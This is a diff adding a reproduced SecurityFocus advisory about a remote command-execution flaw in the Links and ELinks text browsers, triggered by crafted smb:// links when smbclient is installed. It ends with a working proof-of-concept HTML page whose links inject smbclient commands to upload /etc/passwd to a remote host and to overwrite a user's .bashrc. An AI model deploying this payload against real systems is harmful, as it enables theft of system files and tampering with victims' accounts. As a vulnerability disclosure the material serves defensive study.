@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/21082/info
+
+Links and ELinks are prone to a remote command-execution vulnerability because the applications fail to properly process website data containing 'smb' commands.
+
+An attacker can exploit this issue to execute arbitrary 'smb' commands on a victim computer. This may help the attacker compromise the application and the underlying system; other attacks are also possible.
+
+Links 1.00pre12 and ELinks 0.11.1 are vulnerable; other versions may also be affected.
+
+NOTE: This vulnerability may be exploited only if 'smbclient' is installed on a target computer.
+
+<html> <a href='smb://www.example.com/work/XXX" YYY; lcd ..; lcd ..; lcd ..; lcd etc; put passwd ; exit; '>Put /etc/passwd</a> <a href='smb://www.example.com/work/XXX" YYY; lcd ..; lcd ..; lcd ..; lcd home; lcd teemu; get HOHO .bashrc; exit; '>Get .bashrc</a> </html>
